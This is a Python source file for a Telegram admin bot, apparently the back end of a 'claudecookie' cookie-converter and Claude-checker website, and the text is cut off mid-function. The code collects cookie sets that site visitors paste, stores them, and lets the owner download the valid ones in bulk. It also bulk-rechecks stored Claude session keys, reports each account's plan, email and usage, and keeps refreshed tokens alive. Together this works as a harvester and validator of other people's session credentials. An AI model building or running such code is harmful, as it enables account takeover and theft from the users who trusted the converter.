#!/usr/bin/env python3
"""claudecookie Telegram admin bot.

Owner-only. Long-polls Telegram (no webhook, so no inbound port or certificate),
reads the SQLite database the ingest service writes, and does two things:

  * answers the owner's button presses with usage stats and cookie downloads;
  * pushes a short alert on new conversions and Claude checks, according to the
    notification settings.

Heavy work (overview, geography, ZIP) runs on a thread pool. The getUpdates
loop only acknowledges the callback and hands the job off.
"""

from __future__ import annotations

import io
import json
import os
import sqlite3
import sys
import tempfile
import threading
import time
import urllib.error
import urllib.request
import zipfile
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timezone
from pathlib import Path

_HERE = Path(__file__).resolve().parent
if str(_HERE) not in sys.path:
    sys.path.insert(0, str(_HERE))

from stats_service import (
    apply_check_to_event,
    check_info,
    execute_check,
    is_site_sample,
    migrate_push_settings,
    resolve_check_country,
)
from claude_check import (
    check_cookie,
    cookie_oneline,
    default_country,
    egress_ok,
    resolve_country,
    session_key_hash,
    split_cookie_sets,
)

DB_PATH = os.environ.get("CC_STATS_DB", "/var/lib/claudecookie/stats.db")
CONF_PATH = os.environ.get("CC_STATS_CONF", "/etc/claudecookie/bot.conf")


def _read_conf() -> dict:
    try:
        with open(CONF_PATH, "r", encoding="utf-8") as f:
            return json.load(f)
    except (OSError, ValueError):
        return {"bot_token": "", "owner_id": 0}


CONF = _read_conf()
TOKEN = CONF.get("bot_token") or ""
OWNER = int(CONF.get("owner_id") or 0)
API = f"https://api.telegram.org/bot{TOKEN}" if TOKEN else ""

FORMAT_LABEL = {
    "netscape": "Netscape", "cookie-editor": "Cookie-Editor",
    "puppeteer": "Puppeteer", "key-value": "Key-Value", "header": "Header",
}
LOCALE_LABEL = {"en": "English", "ru": "Русский", "zh": "中文"}
REASON_LABEL = {
    "empty": "пустой ввод",
    "missing_session": "нет sessionKey",
    "expired": "сессия отклонена / истекла",
    "unreachable": "Claude не ответил",
    "rate_limited": "лимит запросов",
    "invalid": "невалидна",
}
JSON_FORMATS = ("cookie-editor", "puppeteer", "key-value")
SPARK = "▁▂▃▄▅▆▇█"
TG_DOC_MAX = 45 * 1024 * 1024
TOGGLE_KEYS = frozenset({
    "push_convert", "push_check_valid", "push_check_invalid", "daily_summary",
})
WORK = ThreadPoolExecutor(max_workers=2, thread_name_prefix="cc-bot")
_recheck_guard = threading.Lock()
_recheck_running = False


def log(msg: str) -> None:
    print(f"cc-bot: {msg}", file=sys.stderr, flush=True)


def _api(method: str, payload: dict, files: dict | None = None, timeout: float = 20) -> dict:
    if not API:
        return {"ok": False, "error": "no token"}
    if method == "getUpdates":
        timeout = max(timeout, float(payload.get("timeout") or 0) + 15)
    url = f"{API}/{method}"
    try:
        if files:
            return _multipart(url, payload, files, timeout=90)
        data = json.dumps(payload).encode()
        req = urllib.request.Request(url, data=data, headers={"Content-Type": "application/json"})
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return json.loads(r.read())
    except urllib.error.HTTPError as e:
        try:
            return json.loads(e.read())
        except Exception:
            return {"ok": False, "error": str(e)}
    except Exception as e:
        return {"ok": False, "error": str(e)}


def _multipart(url: str, fields: dict, files: dict, timeout: float = 90) -> dict:
    boundary = "----ccb" + os.urandom(8).hex()
    body = io.BytesIO()

    def w(s):
        body.write(s.encode() if isinstance(s, str) else s)

    for k, v in fields.items():
        w(f"--{boundary}\r\nContent-Disposition: form-data; name=\"{k}\"\r\n\r\n{v}\r\n")
    for k, (fname, content) in files.items():
        w(f"--{boundary}\r\nContent-Disposition: form-data; name=\"{k}\"; filename=\"{fname}\"\r\n")
        w("Content-Type: application/octet-stream\r\n\r\n")
        w(content if isinstance(content, bytes) else content.encode())
        w("\r\n")
    w(f"--{boundary}--\r\n")

    req = urllib.request.Request(
        url, data=body.getvalue(),
        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return json.loads(r.read())
    except Exception as e:
        return {"ok": False, "error": str(e)}


def send(chat_id: int, text: str, keyboard=None):
    payload = {"chat_id": chat_id, "text": text, "parse_mode": "HTML",
               "disable_web_page_preview": True}
    if keyboard is not None:
        payload["reply_markup"] = {"inline_keyboard": keyboard}
    r = _api("sendMessage", payload)
    if not r.get("ok"):
        log(f"sendMessage failed: {r.get('description') or r.get('error')}")
    return r


def edit(chat_id: int, message_id: int, text: str, keyboard=None):
    payload = {"chat_id": chat_id, "message_id": message_id, "text": text,
               "parse_mode": "HTML", "disable_web_page_preview": True}
    if keyboard is not None:
        payload["reply_markup"] = {"inline_keyboard": keyboard}
    r = _api("editMessageText", payload)
    if not r.get("ok"):
        desc = (r.get("description") or r.get("error") or "").lower()
        if "not modified" not in desc:
            log(f"editMessageText failed: {desc}")
    return r


def send_document(chat_id: int, filename: str, content, caption: str = ""):
    return _api(
        "sendDocument",
        {"chat_id": chat_id, "caption": caption, "parse_mode": "HTML"},
        files={"document": (filename, content)},
        timeout=90,
    )


def answer_callback(cb_id: str, text: str = ""):
    _api("answerCallbackQuery", {"callback_query_id": cb_id, "text": text}, timeout=10)


def db() -> sqlite3.Connection:
    conn = sqlite3.connect(DB_PATH, timeout=5)
    conn.execute("PRAGMA busy_timeout=5000")
    conn.row_factory = sqlite3.Row
    return conn


def scalar(conn, sql, *params):
    r = conn.execute(sql, params).fetchone()
    return (r[0] if r and r[0] is not None else 0)


def get_setting(conn, key, default="1"):
    r = conn.execute("SELECT value FROM settings WHERE key=?", (key,)).fetchone()
    return r[0] if r else default


def set_setting(key, value):
    conn = db()
    conn.execute(
        "INSERT INTO settings(key,value) VALUES(?,?) "
        "ON CONFLICT(key) DO UPDATE SET value=excluded.value",
        (key, str(value)),
    )
    conn.commit()
    conn.close()


def get_state(conn, key, default="0"):
    r = conn.execute("SELECT value FROM botstate WHERE key=?", (key,)).fetchone()
    return r[0] if r else default


def set_state(conn, key, value):
    conn.execute(
        "INSERT INTO botstate(key,value) VALUES(?,?) "
        "ON CONFLICT(key) DO UPDATE SET value=excluded.value",
        (key, str(value)),
    )
    conn.commit()


def load_info(row) -> dict:
    try:
        return json.loads(row["info"]) if row["info"] else {}
    except (ValueError, TypeError):
        return {}


def fmt(n) -> str:
    return f"{int(n):,}".replace(",", " ")


def _html(text) -> str:
    return (str(text).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;"))


def _has_blob(conn) -> bool:
    row = conn.execute(
        "SELECT 1 FROM sqlite_master WHERE type='table' AND name='blobs'"
    ).fetchone()
    return bool(row)


def view_overview(conn) -> str:
    t = int(time.time())
    day0 = datetime.now(timezone.utc).strftime("%Y-%m-%d")
    conv = scalar(conn, "SELECT COUNT(*) FROM events WHERE type='convert'")
    conv_today = scalar(conn, "SELECT COUNT(*) FROM events WHERE type='convert' AND day=?", day0)
    conv_7 = scalar(conn, "SELECT COUNT(*) FROM events WHERE type='convert' AND ts>=?", t - 7 * 86400)
    conv_30 = scalar(conn, "SELECT COUNT(*) FROM events WHERE type='convert' AND ts>=?", t - 30 * 86400)
    lines = scalar(conn, "SELECT COALESCE(SUM(n),0) FROM events WHERE type='convert'")
    checks = scalar(conn, "SELECT COUNT(*) FROM events WHERE type='check'")
    checks_today = scalar(conn, "SELECT COUNT(*) FROM events WHERE type='check' AND day=?", day0)
    checks_ok_today = scalar(
        conn, "SELECT COUNT(*) FROM events WHERE type='check' AND valid=1 AND day=?", day0)
    checks_bad_today = scalar(
        conn, "SELECT COUNT(*) FROM events WHERE type='check' AND valid=0 AND day=?", day0)
    checks_7 = scalar(conn, "SELECT COUNT(*) FROM events WHERE type='check' AND ts>=?", t - 7 * 86400)
    checks_30 = scalar(conn, "SELECT COUNT(*) FROM events WHERE type='check' AND ts>=?", t - 30 * 86400)
    checks_ok = scalar(conn, "SELECT COUNT(*) FROM events WHERE type='check' AND valid=1")
    checks_bad = scalar(conn, "SELECT COUNT(*) FROM events WHERE type='check' AND valid=0")
    pv = scalar(conn, "SELECT COUNT(*) FROM events WHERE type='pageview'")
    visitors = scalar(conn, "SELECT COUNT(DISTINCT visitor) FROM events")
    return (
        "<b>📊 Обзор</b>\n\n"
        f"🔄 Конвертаций: <b>{fmt(conv)}</b>\n"
        f"   сегодня {fmt(conv_today)} · 7д {fmt(conv_7)} · 30д {fmt(conv_30)}\n"
        f"🍪 Строк‑куки в конвертере: <b>{fmt(lines)}</b>\n"
        f"   <i>это строки внутри наборов, не число вставок</i>\n\n"
        f"🔎 Проверок Claude: <b>{fmt(checks)}</b>\n"
        f"   сегодня {fmt(checks_today)} · ✅ {fmt(checks_ok_today)} · ❌ {fmt(checks_bad_today)}\n"
        f"   7д {fmt(checks_7)} · 30д {fmt(checks_30)}\n"
        f"   всего ✅ {fmt(checks_ok)} · ❌ {fmt(checks_bad)}\n\n"
        f"👁 Просмотров: <b>{fmt(pv)}</b>\n"
        f"👤 Уникальных: <b>{fmt(visitors)}</b>"
    )


def _bars(rows, label_fn, value_key="count", width=10):
    if not rows:
        return "  <i>нет данных</i>"
    mx = max(r[value_key] for r in rows) or 1
    out = []
    for r in rows:
        filled = round(r[value_key] / mx * width)
        bar = "█" * filled + "·" * (width - filled)
        out.append(f"<code>{bar}</code> {label_fn(r)} — <b>{fmt(r[value_key])}</b>")
    return "\n".join(out)


def view_conversions(conn) -> str:
    dirs = conn.execute(
        "SELECT from_fmt f, to_fmt t, COUNT(*) count FROM events "
        "WHERE type='convert' AND from_fmt IS NOT NULL AND to_fmt IS NOT NULL "
        "GROUP BY f,t ORDER BY count DESC LIMIT 10").fetchall()
    tf = conn.execute(
        "SELECT to_fmt fmt, COUNT(*) count FROM events "
        "WHERE type='convert' AND to_fmt IS NOT NULL GROUP BY to_fmt ORDER BY count DESC").fetchall()
    dom = conn.execute(
        "SELECT domains FROM events WHERE type='convert' AND domains IS NOT NULL").fetchall()
    dcount: dict[str, int] = {}
    for row in dom:
        for d in (row["domains"] or "").split(","):
            if d:
                dcount[d] = dcount.get(d, 0) + 1
    top_dom = sorted(dcount.items(), key=lambda x: -x[1])[:8]

    parts = ["<b>🔄 Конвертации</b>\n"]
    parts.append("<u>Направления</u>\n" + _bars(
        dirs, lambda r: f"{FORMAT_LABEL.get(r['f'], r['f'])}→{FORMAT_LABEL.get(r['t'], r['t'])}"))
    parts.append("\n<u>Целевой формат</u>\n" + _bars(
        tf, lambda r: FORMAT_LABEL.get(r["fmt"], r["fmt"])))
    if top_dom:
        parts.append("\n<u>Топ доменов</u>\n" + "\n".join(
            f"• {_html(d)} — <b>{fmt(c)}</b>" for d, c in top_dom))
    return "\n".join(parts)


def view_checks(conn) -> str:
    total = scalar(conn, "SELECT COUNT(*) FROM events WHERE type='check'")
    ok = scalar(conn, "SELECT COUNT(*) FROM events WHERE type='check' AND valid=1")
    bad = scalar(conn, "SELECT COUNT(*) FROM events WHERE type='check' AND valid=0")
    if total == 0:
        return "<b>🔎 Проверки Claude</b>\n\n<i>Пока нет проверок.</i>"

    plans: dict[str, int] = {}
    for r in conn.execute(
        "SELECT info FROM events WHERE type='check' AND valid=1 AND info IS NOT NULL"
    ):
        plan = (load_info(r).get("plan") or "Claude")
        plans[plan] = plans.get(plan, 0) + 1
    top_plans = sorted(plans.items(), key=lambda x: -x[1])[:6]

    reasons = conn.execute(
        "SELECT COALESCE(reason,'invalid') reason, COUNT(*) count FROM events "
        "WHERE type='check' AND valid=0 GROUP BY reason ORDER BY count DESC").fetchall()

    parts = [
        "<b>🔎 Проверки Claude</b>\n",
        f"Всего: <b>{fmt(total)}</b> · ✅ <b>{fmt(ok)}</b> · ❌ <b>{fmt(bad)}</b>\n",
    ]
    if top_plans:
        parts.append("<u>Планы валидных</u>\n" + "\n".join(
            f"• {_html(p)} — <b>{fmt(c)}</b>" for p, c in top_plans))
    if reasons:
        parts.append("\n<u>Причины отказа</u>\n" + "\n".join(
            f"• {REASON_LABEL.get(r['reason'], r['reason'])} — <b>{fmt(r['count'])}</b>"
            for r in reasons))
    return "\n".join(parts)


def _flag(cc: str) -> str:
    if cc and len(cc) == 2:
        return "".join(chr(0x1F1E6 + ord(c) - 65) for c in cc.upper())
    return ""


def view_countries(conn) -> str:
    countries = conn.execute(
        "SELECT CASE WHEN country IS NULL OR country='' THEN '' ELSE country END AS country, "
        "COUNT(DISTINCT visitor) AS count FROM events "
        "GROUP BY 1 ORDER BY count DESC LIMIT 12"
    ).fetchall()
    locales = conn.execute(
        "SELECT locale, COUNT(DISTINCT visitor) AS count FROM events "
        "WHERE locale IS NOT NULL GROUP BY locale ORDER BY count DESC"
    ).fetchall()
    devices = conn.execute(
        "SELECT device, COUNT(DISTINCT visitor) AS count FROM events "
        "WHERE device IS NOT NULL GROUP BY device"
    ).fetchall()

    def country_label(r):
        cc = r["country"]
        if not cc:
            return "не определено"
        flag = _flag(cc)
        return f"{flag} {cc}".strip()

    parts = [
        "<b>🌍 География</b>\n",
        "<i>уникальные посетители, не число событий</i>\n",
        "<u>Страны</u>\n" + _bars(countries, country_label),
        "\n<u>Языки</u>\n" + _bars(
            locales, lambda r: LOCALE_LABEL.get(r["locale"], r["locale"])),
        "\n<u>Устройства</u>\n" + _bars(devices, lambda r: r["device"]),
    ]
    return "\n".join(parts)


def _spark(vals) -> str:
    mx = max(vals) or 1
    return "".join(SPARK[min(len(SPARK) - 1, round(v / mx * (len(SPARK) - 1)))] for v in vals)


def _daily_series(conn, where: str) -> list[int]:
    t = int(time.time())
    rows = conn.execute(
        f"SELECT day, COUNT(*) c FROM events WHERE {where} AND ts>=? GROUP BY day",
        (t - 30 * 86400,),
    ).fetchall()
    by = {r["day"]: r["c"] for r in rows}
    vals = []
    for i in range(29, -1, -1):
        d = datetime.fromtimestamp(t - i * 86400, timezone.utc).strftime("%Y-%m-%d")
        vals.append(by.get(d, 0))
    return vals


def view_trend(conn) -> str:
    conv = _daily_series(conn, "type='convert'")
    chk = _daily_series(conn, "type='check'")
    return (
        "<b>📈 Динамика за 30 дней</b>\n\n"
        f"🔄 Конвертации\n<code>{_spark(conv)}</code>\n"
        f"всего {fmt(sum(conv))} · пик {fmt(max(conv) if conv else 0)}\n\n"
        f"🔎 Проверки Claude\n<code>{_spark(chk)}</code>\n"
        f"всего {fmt(sum(chk))} · пик {fmt(max(chk) if chk else 0)}"
    )


def view_recent(conn):
    rows = conn.execute(
        "SELECT id, ts, type, from_fmt, to_fmt, n, country, domains, valid, reason, info "
        "FROM events WHERE type IN ('convert','check') ORDER BY id DESC LIMIT 8"
    ).fetchall()
    if not rows:
        return "<b>🕐 Последнее</b>\n\n<i>Пока нет событий.</i>", _back()
    lines = ["<b>🕐 Последние события</b>\n"]
    kb = []
    for r in rows:
        tm = datetime.fromtimestamp(r["ts"], timezone.utc).strftime("%d.%m %H:%M")
        if r["type"] == "check":
            if r["valid"] == 1:
                plan = load_info(r).get("plan") or "Claude"
                lines.append(f"<code>{tm}</code> · 🔎✅ {_html(plan)}")
            else:
                reason = REASON_LABEL.get(r["reason"] or "invalid", r["reason"] or "invalid")
                lines.append(f"<code>{tm}</code> · 🔎❌ {reason}")
            kb.append([{"text": f"📄 Проверка {tm}", "callback_data": f"file:{r['id']}"}])
        else:
            d = (r["domains"] or "").split(",")[0] if r["domains"] else "—"
            lines.append(
                f"<code>{tm}</code> · 🔄 {FORMAT_LABEL.get(r['from_fmt'], r['from_fmt'])}→"
                f"{FORMAT_LABEL.get(r['to_fmt'], r['to_fmt'])} · {fmt(r['n'] or 0)} строк · {_html(d)}")
            kb.append([{"text": f"📄 Файл {tm}", "callback_data": f"file:{r['id']}"}])
    kb.append([{"text": "‹ Назад", "callback_data": "home"}])
    return "\n".join(lines), kb


def view_settings(conn) -> tuple[str, list]:
    migrate_push_settings(conn)
    conn.commit()
    conv = get_setting(conn, "push_convert", "1") == "1"
    valid = get_setting(conn, "push_check_valid", "1") == "1"
    invalid = get_setting(conn, "push_check_invalid", "1") == "1"
    daily = get_setting(conn, "daily_summary", "1") == "1"
    txt = (
        "<b>⚙️ Настройки уведомлений</b>\n\n"
        "Уведомления короткие (без файла). Сами куки скачиваются в разделе «📥 Куки».\n\n"
        f"🔄 Пуш о конвертациях: <b>{'вкл' if conv else 'выкл'}</b>\n"
        f"✅ Пуш о валидных проверках: <b>{'вкл' if valid else 'выкл'}</b>\n"
        f"❌ Пуш о невалидных проверках: <b>{'вкл' if invalid else 'выкл'}</b>\n"
        f"📅 Дневная сводка (09:00 UTC): <b>{'вкл' if daily else 'выкл'}</b>"
    )
    kb = [
        [{"text": f"🔄 Конвертации: {'выключить' if conv else 'включить'}",
          "callback_data": "set:push_convert"}],
        [{"text": f"✅ Валидные: {'выключить' if valid else 'включить'}",
          "callback_data": "set:push_check_valid"}],
        [{"text": f"❌ Невалидные: {'выключить' if invalid else 'включить'}",
          "callback_data": "set:push_check_invalid"}],
        [{"text": f"📅 Сводка: {'выключить' if daily else 'включить'}",
          "callback_data": "set:daily_summary"}],
        [{"text": "‹ Назад", "callback_data": "home"}],
    ]
    return txt, kb


def _pipeline_blob_count(conn, valid_only: bool) -> int:
    if not _has_blob(conn):
        return 0
    extra = "AND e.valid=1" if valid_only else ""
    return scalar(
        conn,
        f"SELECT COUNT(*) FROM events e JOIN blobs b ON b.event_id=e.id "
        f"WHERE e.type IN ('convert','check') {extra}",
    )


def _pipeline_blob_rows(conn, valid_only: bool):
    extra = "AND e.valid=1" if valid_only else ""
    return conn.execute(
        f"SELECT e.id, e.ts, e.type, e.to_fmt, e.valid, b.output FROM events e "
        f"JOIN blobs b ON b.event_id=e.id "
        f"WHERE e.type IN ('convert','check') {extra} ORDER BY e.id",
    ).fetchall()


def view_cookies(conn) -> tuple[str, list]:
    valid = _pipeline_blob_count(conn, True)
    total = _pipeline_blob_count(conn, False)
    txt = (
        "<b>📥 Куки</b>\n\n"
        "Один склад: конвертер и проверка логина.\n\n"
        f"✅ Валидные: <b>{fmt(valid)}</b>\n"
        f"📦 Все: <b>{fmt(total)}</b>"
    )
    kb = [
        [{"text": "Скачать валидные", "callback_data": "ck:valid"}],
        [{"text": "Скачать все", "callback_data": "ck:all"}],
        [{"text": "Проверить все куки на валид", "callback_data": "ck:recheck"}],
        [{"text": "‹ Назад", "callback_data": "home"}],
    ]
    return txt, kb


def view_cookies_mode(conn, pile: str) -> tuple[str, list]:
    valid_only = pile == "valid"
    n = _pipeline_blob_count(conn, valid_only)
    title = "Валидные" if valid_only else "Все"
    txt = (
        f"<b>📥 {title}</b>\n\n"
        f"Наборов: <b>{fmt(n)}</b>\n"
        "Скачать по отдельности (ZIP, файл на набор) или одним файлом "
        "(одна кука — одна строка)."
    )
    kb = [
        [{"text": "По отдельности", "callback_data": f"dl:{pile}:zip"},
         {"text": "Одним файлом", "callback_data": f"dl:{pile}:txt"}],
        [{"text": "‹ Назад", "callback_data": "cookies"}],
    ]
    return txt, kb


def _stamp(ts) -> str:
    return datetime.fromtimestamp(ts, timezone.utc).strftime("%Y%m%d-%H%M%S")


def _unique_name(seen: dict[str, int], name: str) -> str:
    if name in seen:
        seen[name] += 1
        base, _, ext = name.rpartition(".")
        return f"{base}-{seen[name]}.{ext}" if ext else f"{name}-{seen[name]}"
    seen[name] = 0
    return name


def build_zip_file(rows, name_fn) -> tuple[str, int]:
    fd, path = tempfile.mkstemp(prefix="cc-zip-", suffix=".zip")
    os.close(fd)
    count = 0
    seen: dict[str, int] = {}
    try:
        with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as z:
            for r in rows:
                name = _unique_name(seen, name_fn(r))
                z.writestr(name, r["output"] or "")
                count += 1
    except Exception:
        try:
            os.unlink(path)
        except OSError:
            pass
        raise
    return path, count


def _send_zip(chat_id: int, path: str, fname: str, caption: str) -> None:
    try:
        with open(path, "rb") as f:
            send_document(chat_id, fname, f.read(), caption)
    finally:
        try:
            os.unlink(path)
        except OSError:
            pass


def _zip_entry_name(row) -> str:
    if row["type"] == "check":
        return f"check-{row['id']}-{_stamp(row['ts'])}.txt"
    ext = "json" if row["to_fmt"] in JSON_FORMATS else "txt"
    return f"convert-{row['id']}-{_stamp(row['ts'])}.{ext}"


def _send_txt_or_zip(chat_id: int, fname: str, text: str, caption: str) -> None:
    data = text.encode("utf-8")
    if len(data) <= TG_DOC_MAX:
        send_document(chat_id, fname, data, caption)
        return
    rows = [{"output": text}]
    path, _n = build_zip_file(rows, lambda _r: fname)
    _send_zip(chat_id, path, fname.replace(".txt", ".zip"), caption)


def download_pipeline(conn, chat_id: int, pile: str, mode: str) -> str:
    if not _has_blob(conn):
        return "Нет данных"
    rows = _pipeline_blob_rows(conn, pile == "valid")
    if not rows:
        return "Нет данных"
    label = "валидные" if pile == "valid" else "все"
    stamp = _stamp(int(time.time()))
    n = len(rows)
    caption = f"📥 Куки · {label} · {n} шт."
    if mode == "zip":
        path, packed = build_zip_file(rows, _zip_entry_name)
        if packed == 0:
            try:
                os.unlink(path)
            except OSError:
                pass
            return "Нет данных"
        _send_zip(chat_id, path, f"cookies-{pile}-{stamp}.zip", caption)
        return f"Отправлено: {packed} шт."
    lines = [cookie_oneline(r["output"] or "") for r in rows]
    body = "\n".join(lines)
    if body:
        body += "\n"
    _send_txt_or_zip(chat_id, f"cookies-{pile}-{stamp}.txt", body, caption)
    return f"Отправлено: {n} шт."


def recheck_all_stored() -> dict:
    """Re-check every stored convert/check blob. Updates the same rows.

    The same sessionKey is probed once (force, no 60s cache) and the result is
    written onto every event that carries it. Pastes without a session key stay
    as they are (valid NULL) and are not sent to Claude.
    """
    conn = db()
    try:
        rows = _pipeline_blob_rows(conn, False)
    finally:
        conn.close()

    groups: dict[str, list[tuple[int, str]]] = {}
    skipped = 0
    for row in rows:
        raw = row["output"] or ""
        sid = session_key_hash(raw)
        if sid is None:
            skipped += 1
            continue
        groups.setdefault(sid, []).append((int(row["id"]), raw))

    valid = 0
    invalid = 0
    for sid, items in groups.items():
        raw = items[-1][1]
        country = resolve_check_country(sid, None, None)
        if not egress_ok(country, sid):
            result = {"ok": False, "invalidReason": "unreachable"}
        else:
            result, _cached = execute_check(raw, sid, country, force=True)
        for event_id, original in items:
            apply_check_to_event(event_id, original, result)
        if result.get("ok"):
            valid += len(items)
        else:
            invalid += len(items)

    return {
        "total": len(rows),
        "unique": len(groups),
        "valid": valid,
        "invalid": invalid,
        "skipped": skipped,
    }


def _recheck_summary(stats: dict) -> str:
    return (
        "🔎 <b>Проверка всех кук</b>\n\n"
        f"Наборов: <b>{fmt(stats['total'])}</b>"
        f" · уникальных сессий: <b>{fmt(stats['unique'])}</b>\n"
        f"✅ валидных: <b>{fmt(stats['valid'])}</b>\n"
        f"❌ невалидных: <b>{fmt(stats['invalid'])}</b>\n"
        f"⏭ без sessionKey: <b>{fmt(stats['skipped'])}</b>"
    )


def _job_recheck_all(chat_id: int) -> None:
    global _recheck_running
    with _recheck_guard:
        if _recheck_running:
            send(chat_id, "Уже идёт проверка всех кук.")
            return
        _recheck_running = True
    try:
        send(chat_id, "⏳ Проверяю все сохранённые куки…")
        stats = recheck_all_stored()
        if stats["total"] == 0:
            send(chat_id, "Нет кук для проверки.")
            return
        send(chat_id, _recheck_summary(stats))
    except Exception as e:
        log(f"recheck all failed: {e!r}")
        send(chat_id, "Не удалось проверить все куки.")
    finally:
        with _recheck_guard:
            _recheck_running = False


HOME_KB = [
    [{"text": "📊 Обзор", "callback_data": "overview"},
     {"text": "🔄 Конвертации", "callback_data": "conversions"}],
    [{"text": "🌍 География", "callback_data": "countries"},
     {"text": "📈 30 дней", "callback_data": "trend"}],
    [{"text": "🔎 Проверки Claude", "callback_data": "checks"},
     {"text": "🕐 Последнее", "callback_data": "recent"}],
    [{"text": "📥 Куки", "callback_data": "cookies"},
     {"text": "⚙️ Настройки", "callback_data": "settings"}],
]


def home_text() -> str:
    return ("<b>🍪 claudecookie · admin</b>\n\n"
            "Личная статистика конвертера и чекера Claude. Выбери раздел:\n\n"
            "<i>💡 Вставь сюда одну куку или пачку (5–10 разных) — проверю все "
            "и пришлю сводку + ZIP валидных.</i>")


def _back():
    return [[{"text": "‹ Назад", "callback_data": "home"}]]


def _screen(data: str, conn):
    if data == "home":
        return home_text(), HOME_KB
    if data == "overview":
        return view_overview(conn), _back()
    if data == "conversions":
        return view_conversions(conn), _back()
    if data == "checks":
        return view_checks(conn), _back()
    if data == "countries":
        return view_countries(conn), _back()
    if data == "trend":
        return view_trend(conn), _back()
    if data == "recent":
        return view_recent(conn)
    if data == "settings":
        return view_settings(conn)
    if data == "cookies":
        return view_cookies(conn)
    if data == "ck:valid":
        return view_cookies_mode(conn, "valid")
    if data == "ck:all":
        return view_cookies_mode(conn, "all")
    return None


def _job_screen(data: str, chat_id: int, mid: int) -> None:
    conn = db()
    try:
        if data.startswith("set:"):
            key = data.split(":", 1)[1]
            if key not in TOGGLE_KEYS:
                return
            cur = get_setting(conn, key, "1")
            set_setting(key, "0" if cur == "1" else "1")
            conn.close()
            conn = db()
            txt, kb = view_settings(conn)
            edit(chat_id, mid, txt, kb)
            return
        screen = _screen(data, conn)
        if screen:
            txt, kb = screen
            edit(chat_id, mid, txt, kb)
    except Exception as e:
        log(f"screen '{data}' failed: {e!r}")
        send(chat_id, "Не удалось открыть раздел. Попробуй ещё раз.")
    finally:
        conn.close()


def _job_download(kind: str, chat_id: int, spec: tuple) -> None:
    conn = db()
    try:
        toast = download_pipeline(conn, chat_id, spec[0], spec[1])
        if toast.startswith("Нет"):
            send(chat_id, toast)
    except Exception as e:
        log(f"download {kind} failed: {e!r}")
        send(chat_id, "Не удалось собрать архив.")
    finally:
        conn.close()


def _job_file(chat_id: int, rid: int) -> None:
    conn = db()
    try:
        if _has_blob(conn):
            r = conn.execute(
                "SELECT e.ts, e.type, e.to_fmt, b.output FROM events e "
                "JOIN blobs b ON b.event_id=e.id WHERE e.id=?",
                (rid,),
            ).fetchone()
        else:
            r = None
        if r and r["output"]:
            if r["type"] == "check":
                ext, tag = "txt", "check"
            else:
                ext = "json" if r["to_fmt"] in JSON_FORMATS else "txt"
                tag = "cookies"
            send_document(
                chat_id, f"{tag}-{_stamp(r['ts'])}.{ext}", r["output"],
                caption=f"🍪 {_stamp(r['ts'])}",
            )
        else:
            send(chat_id, "Файл недоступен")
    except Exception as e:
        log(f"file #{rid} failed: {e!r}")
        send(chat_id, "Файл недоступен")
    finally:
        conn.close()


def _looks_like_cookies(text: str) -> bool:
    """Cheap check: does an owner message look like pasted cookies (not chatter)?"""
    t = text.strip()
    if not t:
        return False
    if "sessionKey" in t or "sessionKeyV3" in t:
        return True
    if t[:1] in "[{":
        return True
    # A Netscape tab line (>=7 tab fields) or a name=value; header.
    for line in t.split("\n"):
        s = line.strip()
        if s and not s.startswith("#") and len(s.split("\t")) >= 7:
            return True
    return False


def _store_bot_check(conn, raw: str, res: dict) -> None:
    """Persist a bot-checked cookie as a `check` event (+ blob), like the web path,
    so it lands in «📥 Куки» and keep-alive keeps the live token."""
    ok = bool(res.get("ok"))
    ts = int(time.time())
    day = datetime.now(timezone.utc).strftime("%Y-%m-%d")
    info = json.dumps(check_info(res), ensure_ascii=False) if ok else None
    stored = res.get("freshCookie") or raw
    cur = conn.execute(
        "INSERT INTO events (ts,day,type,visitor,country,locale,device,path,"
        "from_fmt,to_fmt,n,domains,output,valid,reason,info) VALUES "
        "(?,?,'check','bot',NULL,NULL,'bot','/bot',NULL,NULL,1,'claude.ai',NULL,?,?,?)",
        (ts, day, 1 if ok else 0, None if ok else (res.get("invalidReason") or "invalid"), info),
    )
    if stored:
        conn.execute(
            "INSERT INTO blobs (event_id, output) VALUES (?, ?)",
            (int(cur.lastrowid), stored[:512 * 1024]),
        )
    conn.commit()


def _batch_summary(results: list[tuple[str, dict]]) -> str:
    ok = sum(1 for _, r in results if r.get("ok"))
    bad = len(results) - ok
    lines = [f"🍪 <b>Пакетная проверка</b> · {len(results)} шт · ✅ {ok} / ❌ {bad}\n"]
    for i, (_, r) in enumerate(results, 1):
        if r.get("ok"):
            plan = r.get("planLabel") or "Claude"
            email = r.get("email") or "—"
            sess = (r.get("session") or {}).get("percent")
            week = (r.get("weekly") or {}).get("percent")
            s = f"{sess}%" if sess is not None else "—"
            w = f"{week}%" if week is not None else "—"
            lines.append(f"{i}. ✅ <b>{_html(plan)}</b> · <code>{_html(email)}</code> · 5ч {s} · 7д {w}")
        else:
            reason = REASON_LABEL.get(r.get("invalidReason") or "invalid", r.get("invalidReason") or "invalid")
            lines.append(f"{i}. ❌ {reason}")
    return "\n".join(lines)


def _job_batch_check(chat_id: int, text: str) -> None:
    """Owner pasted a batch of cookies: split, check each, reply with a summary and
    a ZIP of the valid (live) ones, and store every set in the DB."""
    sets = split_cookie_sets(text)
    if not sets:
        send(chat_id, "Не нашёл куки в сообщении. Вставь sessionKey / JSON / cookies.txt.")
        return
    send(chat_id, f"⏳ Проверяю {len(sets)} шт…")
    results: list[tuple[str, dict]] = []
    conn = db()
    try:
        for raw in sets:
            sid = session_key_hash(raw)
            country = resolve_country(None, None)  # bot has no tz/IP -> neutral supported exit
            if not egress_ok(country, sid):
                res = {"ok": False, "invalidReason": "unreachable"}
            else:
                res = check_cookie(raw, country=country, session_id=sid)
                if (not res.get("ok") and res.get("invalidReason") == "unreachable"
                        and country != default_country()):
                    res = check_cookie(raw, country=default_country(), session_id=sid)
            try:
                _store_bot_check(conn, raw, res)
            except Exception as e:
                log(f"bot store check failed: {e!r}")
            results.append((raw, res))
    finally:
        conn.close()

    send(chat_id, _batch_summary(results))

    valid = [(raw, r) for raw, r in results if r.get("ok")]
    if valid:
        stamp = _stamp(int(time.time()))
        rows = [
            {"output": (r.get("freshCookie") or raw), "i": i}
            for i, (raw, r) in enumerate(valid, 1)
        ]
        path, n = build_zip_file(rows, lambda r: f"valid-{r['i']}-{stamp}.txt")
        if n:
